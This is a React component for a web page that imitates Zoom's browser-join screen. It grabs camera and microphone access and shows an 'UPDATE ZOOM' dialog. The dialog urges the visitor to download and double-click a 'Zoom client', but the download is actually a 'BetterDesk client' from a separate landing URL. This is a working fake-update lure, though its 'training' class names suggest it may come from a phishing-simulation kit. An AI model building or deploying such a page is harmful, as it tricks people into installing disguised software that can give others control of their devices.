"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import JoinMeetingForm from "@/components/sites/zoom/join-meeting-form";
import { ZoomFooter, ZoomHeader } from "@/components/sites/zoom/zoom-shell";
import { BETTERDESK_LANDING_URL, redownloadClientForDevice } from "@/lib/zoom-client-release";

type Stage = "permission" | "prejoin";

export default function BrowserJoinFlow({ meetingId }: { meetingId: string }) {
  const [stage, setStage] = useState<Stage>("permission");
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [mediaError, setMediaError] = useState("");
  const [updateMessage, setUpdateMessage] = useState("");
  const [updating, setUpdating] = useState(false);
  const mediaRequested = useRef(false);

  const requestMedia = useCallback(async () => {
    if (!navigator.mediaDevices?.getUserMedia) {
      setMediaError("Camera and microphone access is unavailable in this browser.");
      return;
    }
    try {
      setStream(await navigator.mediaDevices.getUserMedia({ audio: true, video: true }));
      setStage("prejoin");
      setMediaError("");
    } catch {
      setMediaError("Access was not granted. You can change this in your browser’s site settings.");
    }
  }, []);

  useEffect(() => {
    const timer = window.setTimeout(() => {
      if (mediaRequested.current) return;
      mediaRequested.current = true;
      void requestMedia();
    }, 250);

    return () => window.clearTimeout(timer);
  }, [requestMedia]);

  useEffect(() => () => stream?.getTracks().forEach((track) => track.stop()), [stream]);

  async function updateZoom() {
    setUpdating(true);
    setUpdateMessage("");
    const asset = await redownloadClientForDevice();
    setUpdateMessage(asset
      ? `Downloading ${asset.name}. Double-click the downloaded client to run it.`
      : "No matching client download was found.");
    setUpdating(false);
  }

  function continueWithoutMedia() {
    setStage("prejoin");
  }

  return (
    <main className="zoom-meeting-page browser-join-page">
      <ZoomHeader />
      <div className="zoom-content-area browser-join-area">
        <JoinMeetingForm meetingId={meetingId} initialStream={stream} />
        {stage === "permission" && (
          <div className="permission-modal-backdrop">
            <div
              className="zm-modal allow-permission-prompt-container zm-modal--dark react-draggable"
              role="dialog"
              aria-modal="true"
              aria-label="Camera and microphone permissions"
              style={{ touchAction: "none", transform: "translate(0px, 0px)" }}
            >
              <div className="zm-modal-body">
                <div className="zm-modal-body-title" />
                <div className="zm-modal-body-content">
                  <div className="allow-permission-prompt">
                    <img className="zoom-placeholder" src="/sites/zoom/zoom-placeholder.png" alt="zoom-placeholder" />
                    <div className="training-label">UPDATE ZOOM</div>
                    <div className="desc-primary">
                      Zoom client. <button className="permission-update-link" type="button" onClick={() => void updateZoom()}><u>Update Zoom client</u></button>double click to run and update the Zoom client, downloaded on your device in order to use the zoom-private software.
                    </div>
                    <div className="desc-secondary">
                      open the downloaded zoom client. You can turn off your microphone and camera at any time.
                    </div>
                    {updateMessage && (
                      <div className="update-download-status" role="status">
                        {updateMessage}
                        {!updating && updateMessage.startsWith("No matching") && (
                          <> <a href={BETTERDESK_LANDING_URL} target="_blank" rel="noreferrer">Open downloads</a>.</>
                        )}
                      </div>
                    )}
                    {mediaError && <div className="media-access-error" role="alert">{mediaError}</div>}
                    <div className="training-actions">
                      <button className="training-update-button" type="button" onClick={() => void updateZoom()} disabled={updating}>
                        {updating ? "Preparing download…" : "Download BetterDesk client"}
                      </button>
                      {mediaError && (
                        <button className="training-allow-button" type="button" onClick={continueWithoutMedia}>
                          Continue without camera and microphone
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              </div>
              <div className="zm-modal-footer">
                <div className="zm-modal-footer-default"><div className="zm-modal-footer-default-actions" /></div>
              </div>
            </div>
          </div>
        )}
      </div>
      <ZoomFooter />
    </main>
  );
}
